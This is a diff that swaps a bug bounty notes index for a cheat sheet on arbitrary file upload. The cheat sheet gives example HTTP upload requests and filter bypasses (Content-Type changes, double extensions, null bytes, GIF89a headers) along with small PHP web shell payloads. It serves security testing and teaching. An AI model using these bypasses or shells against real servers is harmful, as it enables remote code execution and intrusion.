@@ -1,81 +1,91 @@
-# All about bug bounty
-These are my bug bounty notes that I have gathered from various sources, you can contribute to this repository too!
+# Arbitrary File Upload
 
-![](https://img.shields.io/github/issues/daffainfo/AllAboutBugBounty)
-![](https://img.shields.io/github/forks/daffainfo/AllAboutBugBounty)
-![](https://img.shields.io/github/stars/daffainfo/AllAboutBugBounty)
-![](https://img.shields.io/github/last-commit/daffainfo/AllAboutBugBounty)
+## Introduction
+An arbitrary file upload vulnerability is a type of security flaw that allows an attacker to upload malicious files onto a server.
 
-## List Vulnerability
-- [Arbitrary File Upload](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Arbitrary%20File%20Upload.md)
-- [CRLF Injection](https://github.com/daffainfo/AllAboutBugBounty/blob/master/CRLF%20Injection.md)
-- [Cross Site Request Forgery (CSRF)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Request%20Forgery.md)
-- [Cross Site Scripting (XSS)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md)
-- [Denial of Service (DoS)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Denial%20Of%20Service.md)
-- [Exposed Source Code](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Exposed%20Source%20Code.md)
-- [Host Header Injection](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md)
-- [Insecure Direct Object References (IDOR)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Insecure%20Direct%20Object%20References.md)
-- [Local File Inclusion (LFI)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Local%20File%20Inclusion.md)
-- [Mass Assignment](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Mass%20Assignment.md)
-- [NoSQL Injection (NoSQLi)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md)
-- [OAuth Misconfiguration](https://github.com/daffainfo/AllAboutBugBounty/blob/master/OAuth%20Misconfiguration.md)
-- [Open Redirect](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Open%20Redirect.md)
-- [Reflected File Download (RFD)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Reflected%20File%20Download.md)
-- [Remote File Inclusion (RFI)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Remote%20File%20Inclusion.md)
-- [Server Side Include Injection (SSI Injection)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Server%20Side%20Include%20Injection.md)
-- [Server Side Request Forgery](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Server%20Side%20Request%20Forgery.md)
-- [SQL Injection (SQLi)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/SQL%20Injection.md)
-- [Web Cache Deception](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Web%20Cache%20Deception.md)
-- [Web Cache Poisoning](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Web%20Cache%20Poisoning.md)
+## Where to find
+In upload file feature, for example upload photo profile feature
 
-## List Bypass
-- [Bypass 2FA](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%202FA.md)
-- [Bypass 403](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20403.md)
-- [Bypass 429](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20429.md)
-- [Bypass Captcha](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass/Bypass%20Captcha.md)
+## How to exploit
+1. Change the `Content-Type` value
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
 
-## Checklist
-- [Forgot Password Functionality](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Checklist/Forgot%20Password.md)
-- Register Functionality SOON!
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+```
+Change the Content-Type
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
 
-## CVEs
-- CVEs 2021 (https://github.com/daffainfo/AllAboutBugBounty/blob/master/CVEs/2021)
-- CVEs 2022 (SOON)
-- CVEs 2023 (SOON)
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg
+```
 
-## Miscellaneous
-- [Account Takeover](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Account%20Takeover.md)
-- [Broken Link Hijacking](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Broken%20Link%20Hijacking.md)
-- [Business Logic Errors](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Business%20Logic%20Errors.md)
-- [Default Credentials](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Default%20Credentials.md)
-- [Email Spoofing](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Email%20Spoofing.md)
-- [JWT Vulnerabilities](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/JWT%20Vulnerabilities.md)
-- [Tabnabbing](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Misc/Tabnabbing.md)
+2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
 
-## Technologies
-- [Apache (HTTP Server)](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Apache%20HTTP%20Server.md)
-- [Confluence](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Confluence.md)
-- [Grafana](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Grafana.md)
-- [HAProxy](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/HAProxy.md)
-- [Jenkins](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Jenkins.md)
-- [Jira](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Jira.md)
-- [Joomla](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Joomla.md)
-- [Laravel](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Laravel.md)
-- [Moodle](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Moodle.md)
-- [Nginx](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Nginx.md)
-- [WordPress](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md)
-- [Zend](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/Zend.md)
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
+Content-Type: application/x-php
+```
+Change the request to this
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
 
-## Reconnaissance
-- [Scope Based Recon](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Reconnaissance/Scope.md)
-- [Github Dorks](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Reconnaissance/Github%20Dorks.md)
-- [Google Dorks](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Reconnaissance/Google%20Dorks.md)
-- [Shodan Dorks](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Reconnaissance/Shodan%20Dorks.md)
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+```
 
-## To-Do-List
-- [ ] Tidy up the reconnaisance folder
-- [ ] Added more lesser known web attacks
-- [x] Added CVEs folder
-- [ ] Writes multiple payload bypasses for each vulnerability
-  - [x] Payload XSS for each WAF (Cloudflare, Cloudfront, AWS, etc)
-  - [ ] Payload SQL injection for each WAF (Cloudflare, Cloudfront)
+3. Upload the payload, but start with GIF89a; and
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/gif
+
+GIF89a; <?php system("id") ?>
+```
+And dont forget to change the content-type to image/gif
+
+4. Bypass content length validation, it can be bypassed using small payload
+```
+(<?=`$_GET[x]`?>)
+```
+
+5. Using null byte in filename
+```
+file.php%00.gif
+```
+
+6. Using double extensions for the uploaded file
+```
+file.jpg.php
+```
+
+7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
+```
+file.php5
+```
+
+8. Try to randomly capitalizes the file extension
+```
+file.pHP5
+```
+
+9. Mix the tips!
